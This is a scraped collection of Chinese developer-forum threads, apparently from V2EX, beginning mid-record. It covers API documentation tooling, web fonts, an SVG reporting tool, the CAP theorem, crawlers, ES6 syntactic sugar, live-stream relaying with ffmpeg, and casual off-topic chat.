"曾经因为合租的同学需要分摊某些费用（但是是由其中某人先垫付的），写过一个 web 端的；平时产生花销随手记录，在一段时期后结算一次算出谁应该给谁多少钱。\r", "然而，就写完了测试的时候大家用过一次，以后就没有以后了。", " splitwise 好用到飞起. 我以前也写过一个类似的, 后来发现 sw, 直接抛弃造了一半的轮子"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>维护项目的 API 文档并不是一件轻松的事情，如果你使用过 Swagger ，相信这些问题曾经困扰过你：</p>\n<ul>\n<li>手动编写 response body 太繁琐了</li>\n<li>为了减轻编写 response body 的工作量，又需要把服务端的 DTO 在 Swagger 文件重复写一边</li>\n<li>有时候只是一两个字段的差别，却需要在 Swagger 里新建一个 Reference Object</li>\n<li>文档总是落后于实现，更新文档要花费巨大精力</li>\n</ul>\n<p><a href=\"https://github.com/stackia/test2doc.js\" rel=\"nofollow\">test2doc.js</a> 就是为了解决这个问题而诞生，其核心思想是从单元测试中捕获所需信息，进而生成与代码实现完全同步的文档。</p>\n<p>我们以 <a href=\"https://github.com/djyde/V2EX-API\" rel=\"nofollow\">V2EX API</a> 为例，看看 test2doc.js 如何简化文档维护工作。</p>\n<p>先看看最终的效果是怎样的：</p>\n<p>测试文件： <a href=\"https://github.com/stackia/test2doc.js/blob/master/example/v2ex/v2ex.js\" rel=\"nofollow\">https://github.com/stackia/test2doc.js/blob/master/example/v2ex/v2ex.js</a></p>\n<p>生成的 Swagger 文档： <a href=\"https://github.com/stackia/test2doc.js/blob/master/example/v2ex/v2ex.yaml\" rel=\"nofollow\">https://github.com/stackia/test2doc.js/blob/master/example/v2ex/v2ex.yaml</a></p>\n<p>生成的 API Blueprint 文档： <a href=\"https://github.com/stackia/test2doc.js/blob/master/example/v2ex/v2ex.apib\" rel=\"nofollow\">https://github.com/stackia/test2doc.js/blob/master/example/v2ex/v2ex.apib</a></p>\n<p>（因为 Swagger 不能够很好的支持多 Example 模式，因此事实上 API Blueprint 的文档效果会更好一些）</p>\n<p>你可以使用 <a href=\"http://editor.swagger.io\" rel=\"nofollow\">Swagger Editor</a> / <a href=\"http://swagger.io/swagger-ui/\" rel=\"nofollow\">Swagger UI</a> 来阅读 Swagger 文档，或是使用 <a href=\"http://docs.v2ex1.apiary.io\" rel=\"nofollow\">Apiary</a> 来展示 API Blueprint 。得益于 Swagger 和 API Blueprint 良好的社区生态，我们有大量的工具可以更好的利用这些文档。</p>\n<hr>\n<p>那么，到底该如何使用 test2doc.js 呢？</p>\n<p>首先对 API 文档基本信息做一些定义：</p>\n<pre><code>const doc = require('test2doc')\n\ndoc.title('V2EX 非官方 API 列表')\n  .version('1.0.0')\n  .desc('V2EX 非官方 API 列表，仅供参考，欢迎补充。',\n    '接口来源： https://github.com/djyde/V2EX-API')\n  .scheme('https', 'http')\n  .host('www.v2ex.com')\n  .basePath('/api')\n</code></pre>\n<p>在所有测试结束的时候，告诉 test2doc.js 输出最终文档：</p>\n<pre><code>after(function () {\n  doc.emit(path.join(__dirname, 'v2ex.apib'), 'apib') // 生成 API Blueprint 格式文档\n  doc.emit(path.join(__dirname, 'v2ex.yaml'), 'swagger') // 生成 Swagger 格式文档\n})\n</code></pre>\n<p>我们以最简单的接口——“获取网站信息”为例。在不考虑 test2doc.js 的情况下，我们通常会这样来写测试用例：</p>\n<pre><code>const request = require('supertest')\nrequire('should')\n\ndescribe('Site', function () {\n  it('should provide /api/site/info.json', async function () {\n    const res = await request('https://www.v2ex.com')\n      .get('/api/site/info.json')\n      .expect(200)\n    const body = res.body\n    body.title.should.equal('V2EX')\n    body.slogan.should.be.a.String()\n  })\n})\n</code></pre>\n<p>这里使用 supertest 辅助发起 HTTP 请求，使用 should.js 作为断言库。 node 从 7.6.0 起默认开启了 async/await ，因此我们推荐使用 async/await 。</p>\n<p>接下来想办法让 test2doc.js 捕捉到我们请求的 URL 和响应 body。</p>\n<pre><code>const request = require('supertest')\nrequire('should')\n\nconst doc = require('test2doc')\n\ndescribe('Site', function () {\n  doc.group('Site').basePath('/site').desc('网站相关接口').is(doc =&gt; {\n    it('should provide /api/site/info.json', async function () {\n      await doc.action('获取网站信息').is(async doc =&gt; {\n        const res = await request(base)\n          .get(doc.get('/api/site/info.json'))\n          .expect(200)\n        const body = doc.resBody(res.body)\n        body.title.desc('站名').should.equal('V2EX')\n        body.slogan.desc('口号').should.be.a.String()\n      })\n    })\n  })\n})\n</code></pre>\n<p>注意到我们用 <code>doc.group()</code> 对接口进行了分组，用 <code>doc.action()</code> 声明了想要捕获的接口，而用 <code>.is(doc =&gt; {...})</code> 函数表明了 group 捕获和 action 捕获的作用范围。</p>\n<p>我们用 <code>doc.get('/api/site/info.json')</code> 代替了原来直接传入的字符串，用 <code>doc.resBody(res.body)</code> 代替了原来的 <code>res.body</code>。<code>doc.resBody()</code> 返回了一个经过代理的 body ，于是我们可以在想要做文档标注的字段上面使用 <code>.desc()</code> 来为它添加文档。</p>\n<p>看到这里我想你应该明白了 test2doc.js 的工作原理。 test2doc.js 提供了大量方法来捕获请求、响应的各种信息，在调用 <code>emit()</code> 时利用了这些捕获的信息来生成文档。</p>\n<p>完整的测试可以在 <a href=\"https://github.com/stackia/test2doc.js/blob/master/example/v2ex/v2ex.js\" rel=\"nofollow\">这里</a> 找到。其中展示了 test2doc.js 的多种常用用法。</p>\n<hr>\n<p>test2doc.js 依然有很大的改进空间，譬如可以对 mocha 和 supertest 进行扩展来进一步简化语法，或是跳过 Swagger 和 API Blueprint 直接生成 HTML 文档来绕过由它们造成的限制。 test2doc.js 已经应用在了我司的部分产品上，同事都说非常好用。如果你打算改善一下文档编写的工作流，不妨来试试吧。<a href=\"https://github.com/stackia/test2doc.js/issues\" rel=\"nofollow\">欢迎在 GitHub 反馈问题</a>！</p>\n<p>项目地址： <a href=\"https://github.com/stackia/test2doc.js\" rel=\"nofollow\">https://github.com/stackia/test2doc.js</a></p>\n</div></div>"], "reply": "1", "tittle": "使用 test2doc.js 自动生成 V2EX API 文档", "comment": ["👍"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有没有什么坑？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "现在还有开发淘宝卖家服务程序的吗", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前一个外贸网站设置字体，网上搜索到了很多好看的英文字体，但是又怕老外的电脑里没有安装这种字体而显示不出来，就好比微软雅黑在普通用户的 XP 系统上显示不出来一样，我又不想引进 web font ，那样反而增大页面文件的体积，有没有一种字体既好看老外的电脑上普遍都安装了的字体？</p>\n</div></div>"], "reply": "10", "tittle": "外贸网站全文用什么英文字体最好看？", "comment": ["在国外加载 Google Fonts 的速度比你的站点花的时间还短。。我觉得这根本不是问题。。", "好看的标准很多，取决于衬托什么样的产品和风格，根本没有最好之说", "\r", "自己根据需求挑", "Helvetica\r", "\r", "但个人感觉 Proxima Nova 更好看一点。", "Helvetica +1 我的博客就用的 Helvetic 字体，很好看， ", "Helvetica 是要钱的", "没有「好看的字体」一说，只有合不合适。\r", "\r", "如果你不想引入 Web Font 的话，但又想每个平台上的字体都一样，那么事实上你的选择很少， Mac 和 Windows 上共有的字体其实不多[1]。\r", "\r", "当然，你也可以根据不同的平台，选择不同的字体，正如最常见的 CSS 「 font-family: Helvetica, Arial, sans-serif 」。\r", "\r", "虽然字体是网页设计中很重要的一环，但很多时候选择真的有限。与其想着选一个「好看的字体」，倒不如花点功夫在其他能提高 readability 的东西上。例如字体大小，行高，栏宽，留白等。\r", "\r", "[1]http://www.ampsoft.net/webdesign-l/WindowsMacFonts.html", "Roboto 这个字体很流行.", "推荐个字体排版的指南\r", "《 Typography Handbook 》\r", "\r", "字体选择部分参见 [Font] 部分\r", "\r", "另，中文排版可以参见这个\r", "《 Requirements for Chinese Text Layout 中文排版需求》\r", "roboto 就好， open sans 也不错。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我们在为哈尔滨和昆山的两家客户设计生产管理系统时，需要将各个工位的设备状态时时可视化到中央大屏上显示，并且两家企业在生产过程中都需要制作大量的报表。因为流水线的设计图都是用 AUTOCAD 设计的，并且可能还会需要调整，所以我们将这些需求，独立做成了一款可视化的工具。测试版已经在 OnceDoc 可用，功能还在不断丰富中。条维、二维码、表单提交正在测试，文档和示例也在不断完善中。欢迎大家体验。</p>\n<p>示例： <a href=\"http://cn.oncedoc.com/page/view/oncevi-demo\" rel=\"nofollow\">http://cn.oncedoc.com/page/view/oncevi-demo</a></p>\n<p>主页: <a href=\"http://oncevi.com\" rel=\"nofollow\">http://oncevi.com</a></p>\n<h1>OnceVI 前后端分离的数据可视化报表工具简介</h1>\n<p>企业管理软件在报表的应用上有大量需求，也存在大量困扰。 OnceVI 是一款使用 Web 和 H5 技术打造的前后端分离的报表开发工具。 OnceVI 支持直接在 SVG 矢量图上绑定数据，并通过 JSON 数据格式将后台数据呈现到前端报表界面。开发者可使用任何编程语言来编写 JSON 数据服务， OnceVI 使用内存数据库来缓存数据，使用者不再需要考虑高并发下的性能问题。</p>\n<h2>界面设计</h2>\n<p>与其它报表软件不同，您无需从零开始设计界面。 OnceVI 基于 SVG 矢量图。 SVG 可缩放矢量图形是用于描述二维矢量图形的一种图形格式，它是一个开放标准，目前互联网上有海量的设计素材。您不仅仅可以在 OnceVI 上设计报表界面。您也可以在 Adobe illustrator 中甚至是 AutoCAD 上设计界面。在制作一些监控类时时报表，如智慧工厂和立体仓储的状态监控时，您可以直接将生产线、建设的 CAD 设计图转为 SVG, 作为报表界面，这能极大地降低您的工作量。</p>\n<p>在 Adobe illustrator 中您可以直接将源文件另存为 svg 格式。</p>\n<p><img alt=\"插入图片描述\" src=\"http://cn.oncedoc.com/file/view/demo/demo_pics/invoice_ai.png\"></p>\n<p>您也可以在 OnceVI 上设计 SVG 报表，或者上传设计好的 SVG 进行数据绑定。</p>\n<p><img alt=\"插入图片描述\" src=\"http://cn.oncedoc.com/file/view/demo/demo_pics/invoice_datasource.png\"></p>\n<h2>前后端分离</h2>\n<p>OnceVI 采用前后端分离的设计模式，前后端通过 JSON 来进行数据交换。报表的展示不需要依赖后端实现。您也可以将开发好的报表集成进自己的 Web 服务器中。您可以通过 OnceDoc 私有云版的 Sql Builder 来开发数据服务接口。也可以自己构建基于 JSON 的 Web Service 。</p>\n<p>您可以用任何编程语言来构建数据服务，此时需要使用 JSONP 数据格式或 OnceDoc Proxy 代理工具来解决跨域问题。</p>\n<p><img alt=\"插入图片描述\" src=\"http://cn.oncedoc.com/file/view/demo/demo_pics/invoice_type.png\"></p>\n<h2>数据缓存</h2>\n<p>OnceDoc Proxy 在解决跨域的同时，也提供了一种数据缓存机制。基于 OnceDB 内存数据库实现， OnceDB 是我们基于开源键值数据库 Redis 开发的。 Redis 体积小巧，性能优异，实施简单。特别适合在高并发下做为缓存数据库使用。我们在他的基础上添加了一些新的数据查询指令，以方便做数据过滤、处理和筛选。</p>\n<p>在数据量特别大或者查询条件比较复杂的情况下，通常需要花比较长的时间。 OnceDoc Proxy 会将后台数据处理结果，缓存到内存数据库中。这样在同一时间将只会有一条数据请求  发到您自己的数据服务接口。您有充分的硬件资源和时间去处理海量数据的筛选、处理与分析，而不需要担心并发量。</p>\n<h2>数据预处理</h2>\n<p>OnceVI 支持在前端对数据进行预处理。通过数据预处理，您可以将数据转换成矢量图形的颜色、大小、长度、高度等展示，并且不需要改变后台数据接口。</p>\n<p>点开 Filter 您就可以添加 JavaScript 过滤函数。下面的例子，演示了如何将将各个设备的支行状态（布尔值）转换为颜色显示。</p>\n<p><img alt=\"插入图片描述\" src=\"http://cn.oncedoc.com/file/view/demo/demo_pics/invoice_filter.png\"></p>\n<h2>文本增强</h2>\n<p>SVG 的原生文本并不支持固定文本框大小。因而也不支持文本的居中、右对齐和自动换行等。 OnceVI 增加了一种新的 Textarea 元件，用以支持大段文本的展示 和 HTML 标签的支持。</p>\n<p><img alt=\"插入图片描述\" src=\"http://cn.oncedoc.com/file/view/demo/demo_pics/invoice_textfield.png\"></p>\n<h2>图表支持</h2>\n<p>OnceVI 支持各种图表的展示，您只需在设计界面绑定一个值为二维数组的字段即可。</p>\n<p><img alt=\"插入图片描述\" src=\"http://cn.oncedoc.com/file/view/demo/demo_pics/invoice_chart.png\"></p>\n<p>图表还支持多维数据的呈现，您只填写好相应的数据即可。图表字段的数据源第一个数组是 X 轴的坐标值。如下所示：</p>\n<pre><code>\"chart\": [\n    [\"Category\", \"A\", \"B\", \"C\", \"D\", \"E\", \"F\", \"G\", \"H\"],\n    [\"Apple\", 94.8, -75.4, -101.1, 165.5, -21.76, 125.5, 80.5, -70.7],\n    [\"Orange\", -1.605, -29.63, -43.04, 184.4, -0.605, 184.8, 60.4, -66.2],\n    [\"Banana\", 44, 104.2, -19.82, 291.4, 7.29, 116, -138., -102.9]\n]\n</code></pre>\n<p>绑定上不同的图表后的绘制效果：</p>\n<p><img alt=\"插入图片描述\" src=\"http://cn.oncedoc.com/file/view/demo/demo_pics/invoice_chart_report.png\"></p>\n<h2>时时刷新和动画</h2>\n<p>您可以添加刷新间隔时间来动态刷新你的报表，数据的变化将会以动画渐变的形式展现到报表界面上如颜色、尺寸、高度、数量等。在\"Data Binding\"界面上设置 \"Refresh Interval\" 即可，\"Refresh Interval\" 表示数据刷新间隔，\"0\"表示不刷新数据，单位为秒。借助 OnceDoc Proxy 时时刷新借不会对性能产生影响。</p>\n</div></div>"], "reply": "4", "tittle": "我们制作了一款直接基于 SVG 矢量图绑定数据的可视化报表工具-OnceVI", "comment": ["功能挺复杂的样子", "默默收藏之。", "  使用起来应该不复杂\r", "  感谢支持", "功能好强大的样子，不错，可以去玩一下看看。可提供香港服务器免费测试。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>微服务在业界正获得越来越多的关注，理解微服务架构模式，对现有企业应用转型升级大有帮助。如何快速学习微服务中复杂的概念，掌握其实践，成为众多学习者关注的问题。 DaoCloud 首席架构师王天青 Grissom 为大家带来「 3 分钟学习微服务」系列，为微服务学习 <strong>划 重 点</strong> ！上期我们推出了「事务及分布式事务」，今天的重点：<strong>CAP 定理和数据一致性</strong>。</p>\n<h1>CAP 定理</h1>\n<ul>\n<li>\n<p>2000 年 7 月，加州大学伯克利分校的 Eric Brewer 教授在 ACM PODC 会议上提出 CAP 猜想。</p>\n</li>\n<li>\n<p>2 年后，麻省理工学院的 Seth Gilbert 和 Nancy Lynch 从理论上证明了 CAP 。之后， CAP 理论正式成为分布式计算领域的公认定理。</p>\n</li>\n<li>\n<p>CAP 定理：一个分布式系统最多只能同时满足<strong>一致性</strong>（ Consistency ）、<strong>可用性</strong>（ Availability ）和<strong>分区容错性</strong>（ Partition tolerance ）这三项中的两项。</p>\n</li>\n</ul>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2017-03-09-%E4%B8%8B%E5%8D%886.11.14.png\"></p>\n<h1>一致性</h1>\n<p>一致性指更新操作成功后，所有节点在同一时间的数据完全一致。常见的一致性类别：</p>\n<ul>\n<li>\n<p><strong>Weak （弱一致性）</strong>：当你写入一个新值后，读操作在数据副本上可能读出来，也可能读不出来。比如：某些 cache 系统。</p>\n</li>\n<li>\n<p><strong>Eventually （最终一致性）</strong>：当你写入一个新值后，有可能读不出来，但在某个时间窗口之后保证最终能读出来。比如： DNS ，电子邮件、 Amazon S3 ， Google 搜索引擎这样的系统。</p>\n</li>\n<li>\n<p><strong>Strong （强一致性）</strong>：新的数据一旦写入，在任意副本任意时刻都能读到新值。比如：文件系统， RDBMS ， Azure Table 都是强一致性的。</p>\n</li>\n</ul>\n<h1>Paxos</h1>\n<ul>\n<li>\n<p><strong>Paxos 算法</strong>是基于消息传递且具有高度容错特性的一致性算法，是目前公认的解决分布式一致性问题最有效的算法之一。</p>\n</li>\n<li>\n<p>在常见的分布式系统中，总会发生诸如机器宕机或网络异常（包括消息的延迟、丢失、重复、乱序，还有网络分区）等情况。 Paxos 算法需要解决的问题就是如何在一个可能发生上述异常的分布式系统中，快速且正确地在集群内部对某个数据的值达成一致，并且保证不论发生以上任何异常，都不会破坏整个系统的一致性。</p>\n</li>\n</ul>\n<h1>Raft</h1>\n<ul>\n<li>\n<p>Raft 是斯坦福的 Diego Ongaro 、 John Ousterhout 两个人以易懂（ Understandability ）为目标设计的一致性算法，在 2013 年发布了论文： In Search of an Understandable Consensus Algorithm</p>\n</li>\n<li>\n<p>从 2013 年发布到现在不过只有两年，到现在已经有了十多种语言的 Raft 算法实现框架</p>\n</li>\n</ul>\n<p><strong><a href=\"https://raft.github.io/\" rel=\"nofollow\">RaftDemo</a></strong></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "3 分钟学习微服务系列 | CAP 定理和数据一致性", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题 今天午睡起来 由于是趴着睡觉的\n看四周都是模模糊糊的，忽然想到这个梗</p>\n</div></div>"], "reply": "40", "tittle": "很好奇，古代没有眼镜 近视眼怎么办", "comment": ["古代人大概也很少有近视的吧", " ", " #2 估计是国人杜撰的", "古代年轻人如果都习惯秉烛夜读的话估计近视的应该不少，但似乎很少听说。", "怎么办，吟诗啊\r", "\r", "床前明月光，疑是地上霜", "近视多是电子设备造成的吧", "读书人日读夜读，照明条件也不好，近视也不奇怪。\r", "相当多古代名人是近视的，如欧阳修、祝枝山、纪晓岚，史书都有记载。", "我就是看书看近视的，当然，最后看电视急剧加深了。", "趴近点。", "咪一下眼睛就好了", "能怎么办？生活肯定不方便，但是还是要生活下去", "大家估计又要膜了", "大部分都是农民，种地还戴啥眼镜...", " 他们这些都是进士，有些比进士还大的", "\"香港、台湾地区、新加坡、韩国 20 岁青年近视率趋势\": ", " #2 如果是百度百科的话，估计最后会出现，这么牛逼的人的后代，创立了一个 xxx 眼镜店品牌...", "肉蒲团一文中有一段描述涉及到近视眼的，貌似只能眯眼加凑近了看", "因为没有眼镜，所以古人才用毛笔写字，一个字写那么大。", "至今还是绝对的上联：\r", "进士尽是近视眼", "患了眼疾", " 反正眼镜起源挺早的...", " 朱阁住个诸葛亮", " 是\r", "今世近视尽是近视\r", "吧", "炼气（", " 祝枝山并不是进士，屡试不第，真杯具……", " 恩，应该不是进士，他们江南四大才子其实都是嫖客来的。", " 所以才要卖唐伯虎的画赚钱呀。。。", "这个问题问得好，我竟然从未想过这种问题。", "  有些人天生就是近视啊\r", "这个跟职业没关系吧", " 这我也知道啊，那他们怎么解决这个问题的呢\r", " 那时候有放大镜 ？", " 明代已经有眼镜。清代更不用说了。\r", "更之前的那就没什么办法了，头低点也能看。就这样过的吧，瞎子都能活……\r", "MZD 白内障极严重时是怎么办的？侍从读给他听。欧阳修也是这么解决的。", "这个问题可以延伸出好多问题，比如古代木有套套，他们是怎么避孕的。没有游泳圈，是怎么游泳的？没有姨妈巾是怎么... 好了 想不下去了", " 暴食保是暴尸鬼", " 避孕问题百度偷腥有答案。。。以前无意发现的😂", "毛笔写字能小了么，用什么眼镜啊。", " 蝇头小楷和硬笔字差不多大的。", "眼疾有时会被认为是鬼上身。\r", "\r", "其实以前的人普遍户外运动多一些，并不容易近视", "  你这些问题 太污了 不正经"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近打算爬一个网站数据，链接格式自己都有。想找一个好用的爬虫软件，需求是顺利爬下数据，不被网站主发现。</p>\n<p>源网站是一个购物网站，流量很大。</p>\n<p>=======================\n追加： 源网站链接返回的数据是JSON数据，可以直接用。</p>\n<p>源链接格式为https://<a href=\"http://www.xxxxxx.com?a=YY&amp;b=ZZ\" rel=\"nofollow\">www.xxxxxx.com?a=YY&amp;b=ZZ</a></p>\n<p>爬虫只需要能实现更改不同的a和b就行。其中a是在几个固定的参数里面选，b是page页码。</p>\n</div></div>"], "reply": "9", "tittle": "有哪些好用的开源或者免费爬虫？", "comment": ["火车头？", "用 python 循环一下不就搞定了，不过爬虫的难点在于提高爬取速度", "Scrapy", "一个方法是用 Scrapy 框架搭，另一个方法是用 requests 写\r", "问题除了速度还有反爬虫的问题，可以代理+随机改变请求的 HEAD", "跟爬虫关系不大吧，你这个自己写脚本抓就好了", "我收集的一些爬虫 ", "nutch 啊", "如果只有 2 位数的页面。。。好像没必要弄爬虫。。。 dtm 通配符搞一下就好勒", "srcapy 就不说了，可以试试 webmagic 开箱即用！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://www.v2ex.com/t/344613\" rel=\"nofollow\">https://www.v2ex.com/t/344613</a></p>\n<p>前几天看到这一贴说有没有只做双向绑定的框架，今天读完日语没啥事情，就用一个小时实现了一下这个简单的函数</p>\n<p><img alt=\"preview\" src=\"http://imgur.com/download/Lt0NvcD\"></p>\n<p>好评在 npm 上下载哦</p>\n<p>截图上没有表现出来的是 object.value 手动修改  也会使所有的 dom 刷新 value</p>\n<p>用的原理和 Vue 是一样的 稍稍参考了一下 Vue 的实现</p>\n<p>当然 github 在这里 <a href=\"https://github.com/xingoxu/twoWayBinding\" rel=\"nofollow\">https://github.com/xingoxu/twoWayBinding</a> ，欢迎大力点星（逃）</p>\n</div></div>"], "reply": "11", "tittle": "花一个小时，用 36 行写了一个最简单的 js 双向绑定", "comment": ["39    export default twoWay;\r", "\r", "明明是 39 行 /smile", " 空行去掉好伐啦（", "曾经写过一个 ", "\r", "还搞的各种文档和测试\r", "只是用了 react 后，再没管过它了", "有什么用", " 哇， 我这个只是写着玩一下的，试试自己能不能够实现双向绑定", "老夫只用 jquery", " #5 双向绑定写起来方便，但是灵活性和可控性太差了，还是基于 VirtualDom 的单向数据流更靠得住些", " #6 想到那张神图 ", "其实写得挺好的， 但是我还是忍不住想说一句，代码不换行读起来不舒服啊！  minify 成一行岂不更好？", " 我一般是这么想的，如果匿名函数只有一句话，我是不愿意换行的， if 什么的也是一样     不过我刚发现我自己 forEach 那边应该不换行，怎么就换行了呢。。。拿 jsfiddle 写的 233", " 没什么用，除了业务什么都不要写最好。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题</p>\n<p>另外大家都是在什么平台上使用 HYperloglog 的呀</p>\n</div></div>"], "reply": "3", "tittle": "hyperLoglog 有人用过没，它和 spark 的 wordcount 相比有什么优势？", "comment": ["这两个东西有什么相同点吗？", "奥特曼大战樱桃小丸子", " 怎么讲呢？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前几天面试，说到 ES6 ，有两个面试官都问我，如何看 ES6,第一次我说到箭头函数，我说他是语法糖，然后忘记了他重要的 this 绑定，但是它也的确实现了语法糖。第二次我说 ES6 新增了类的概念，面试官又告诉我 ES6 的类只不过是语法糖而已，我于是又说 ES6 以前的实现起来是使用原型模式，工厂模式， ES6 才终于有了 class bar  extends foo 。</p>\n<p>其实要在我看来，所有的高级编程语言，都是机器语言的语法糖，看你怎么理解。</p>\n</div></div>"], "reply": "14", "tittle": "关于语法糖的讨论", "comment": ["C 语言难道不是汇编语言的语法糖么", "已经被官方定义的语法，怎么能理解成语法糖？连语法糖的定义都没搞懂，面试官水平不行，不要去了。", "类怎么能是语法糖呢 举个例子 kotlin 里面的 obj?.method() 实现了自动判 null 可以写成 obj == null ? null : obj.method() 这是语法糖\r", "但是 kotlin 里面的 lambda 就不是语法糖了 因为有各种优化在里面 不能用直观的方式实现出来\r", "至于所有语言都是机器语言的语法糖的说法 举一个极端点的例子 haskell 就不是用语法糖就能解释的通的 从提出语言到实现第一个编译器经历了几年时间 就是因为里面的一些纯函数式概念不好实现\r", "\r", "总结一下 楼主对语法糖的说法有点强词夺理的感觉", "总感觉抽象和语法糖应该不是一回事", "不这么认为，高级语言和机器语言是两个完全不同的东西。", "面试官说得对。关于语法糖的定义在 wikipedia 里说得很清楚。\r", "\r", "说 ES6 的类是语法糖，其含义是那不是真的类，它并没有使 JS 变成严格意义上的面向对象语言，其实现原理仍然只是原型链而已。", "现在的计算模型基本就是图灵机（与一阶逻辑、 lambda 演算完全等价），机器语言只是对图灵机的建模，只是计算模型的一个实现\r", "程序设计语言当然不是机器语言的语法糖，事实上很多东西都可以计算，比如 dna 计算机、量子计算机，高级机器语言翻译成 dna 计算机的'指令'，里面就没有寄存器、没有机器码了\r", "计算的本质是数理逻辑，是对人思维的仿真，所以现代语言越来越像人说话\r", "\r", "不是一切都是语法糖哦", "确实大部分是语法糖，不过 generator 和 symbol 这种特性就不是语法糖了。", " ", "  第一段\r", "JavaScript classes introduced in ECMAScript 2015 are syntactical sugar over JavaScript's existing prototype-based inheritance. The class syntax is not introducing a new object-oriented inheritance model to JavaScript. JavaScript classes provide a much simpler and clearer syntax to create objects and deal with inheritance.", " 这个好，有理有据，学习了。", " 原型怎么就不算面向对象了...", "汇编语言难道不是 1010 的语法糖", " 原型链不是严格意义上的面向对象，缺少了一些典型功能， JS 不是真正的面向对象语言，这是普遍公认的。 C++之父曾专门写过一篇文章说明什么是面向对象，比较经典了，那个判断方法有一定权威性。", " 学习了。。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在的情况是用的七牛的全家桶,现在想添加一套腾讯云的线路,但是只想用一个地址推流,这个具体是怎么实现的,有了解的么</p>\n</div></div>", "<div class=\"topic_content\">找到一个方案,用 ffmpeg -i rtsp://localhost/live -c copy -f flv rtmp://server/live/h264Stream  命令直接转一手推上去</div>"], "reply": "12", "tittle": "有没有斗鱼和熊猫的同学,直播播放中的多线路,在推流的过程中是怎么实现的", "comment": ["没有大兄弟了解么", "你用 ffmpeg 拉流后再转一路出去就可以了", "同时集成七牛和腾讯的 比较罕见", "这个严格来说不会有人告诉你的， 属于技术保密，我过我是上述 2 家公司的人肯定不跟你说", "同 2#\r", "\r", "我们做演唱会直播，同时推到 8 个平台。就是这么做的，不过用的是 nginx rtmp", " @", "   这样是不是延迟不一样", " 本来 HLS 延迟就是数秒~数十秒起步，假如你是推到一台本地服务，然后 ffmpeg 转成多路的话，中间延迟可以忽略。\r", "当然你要是推到一个平台的服务器上，然后再拉下来推到另一家那当然就不一样了", "  买了这两家的其他服务,顺手用了", "多线路（多个 server 都有流服务）就两个方案呗：\r", "1. client 往多个 server 推\r", "2. client 往一个 server 推，这个 server 再往多个 server 转推\r", "\r", "前面一个太依赖 client 的网络状况，所以就只有第二种办法了。", "肯定不是客户端向多家服务商推流, 太占资源了, 本来用户的上传带宽就有限\r", "估计是先推到一个很快的节点上, 然后其他节点或不同的服务商从第一个节点上拉并分发, 具体方案可以和服务商谈.", "1. 先推到一台服务器，再从服务器推到其他平台\r", "2. 联系七牛或者阿里云，请他们帮转。\r", "\r", "其实原理都一样。参考 srs wiki\r", "联系七牛做转推"]},
{"content": ["<div class=\"topic_content\">在做项目的时候，会一直碰到各种的重复，很多重复不太适合于抽象出通用的库或者框架，这个时候可以通过一些参数来生成代码，简单的情形只需要参数替换，很多 IDE 提供的 code snippet ， live template 等等功能可以用来实现这种简单的情形；复杂的就需要参数的一些调整，支持条件，循环，组合等。\r<br>\r<br>我们在项目中已经多次实践过使用代码生成工具，能有相当大的作用，有兴趣的同学可以去我们网站看看， 有一些在线的代码生成工具，网址： <a target=\"_blank\" href=\"http://www.helpsd.net/lib/cg/index\" rel=\"nofollow\">http://www.helpsd.net/lib/cg/index</a> 。有兴趣的同学也可以加群 473447100 讨论</div>"], "reply": "目前尚无回", "tittle": "代码生成工具", "comment": []},
{"content": "", "reply": "1", "tittle": "bootstrap", "comment": ["bootstrap"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>简单搜索了一下，有辟谣的。any way\n最近感觉身体有点劳累，\n珍爱生命，远离加班</p>\n</div></div>"], "reply": "1", "tittle": "听闻前两天滴滴挂了一个？", "comment": ["上周的新闻了把？好像是挂了"]},
{"content": ["<div class=\"topic_content\">列队来个格式如何?\r<br>毕业时间:2011 年\r<br>毕业校区:清水河\r<br>学院：计算机学院\r<br>描述一个成电的标志性的东西：沙河的银杏\r<br>我想说的话：校友赶紧进来了。。\r<br>\r<br>\r<br>====\r<br>纯水帖，管理员多关照。。。-_-!</div>"], "reply": "32", "tittle": "之前看到一个成电校友的主题,感叹一下又想起了在学校的日子了.然后,校友进来水一发吧..", "comment": ["- - 15 年 清水河的大草原 同计院", "19 年  软院  大概那个是 7:1 ？", "13 年 计算机 图书馆的...伞", "13 机械  <电子科大无美女>", "17 清水河妓院～～", "12 年\r", "自动化\r", "垃圾食堂", "大家知道清水河多了个教学楼多了个湖不？😄", "17 光电 图书馆", "12 清水河畔", "圣光电", "12 自动化 7:1", "16 清水寺 妓院  下雨没人主动给妹子撑伞？", " 是吗？好久没回去了 之前看过读博的同学发过 是漂亮了好多了哦", "14 年 清水河  通信   章萌芊", "小 c", " 这个经典 当时还有一个金刚狼哥", "11 电工 小 c", "uestc", "14 年 EE", "擦， 08 年毕业已经老了…… 6 系 总部沙河", " 在润新混还是新村混的？", "毕业时间:2011 年 \r", "毕业校区:清水河 \r", "学院：电子工程学院\r", "描述一个成电的标志性的东西：知博书店\r", "我想说的话：顺江小区旁边的油菜花开了。", "发错了。上学时间 2011 年，毕业时间 2015 年。", " 润新……万人坑", "冒泡冒泡", " 靠...少年 还记得去买去联通卡上网的日子？然后利用计费 bug 无限挂卡", " 后来已经没有空卡买了", " 是啊 没钱上网就只有耍哈风中论坛和我来我网。水点积分下买流量下 ftp 哈哈哈", " 你应该不是 11 年毕业的吧？？我 08 年毕业的，内网 FTP06 年就撤掉了啊！", " 05 年的 08 年读研搬到清水河啦", " 一届的啊...", " 哦，读研的啊…………"]},
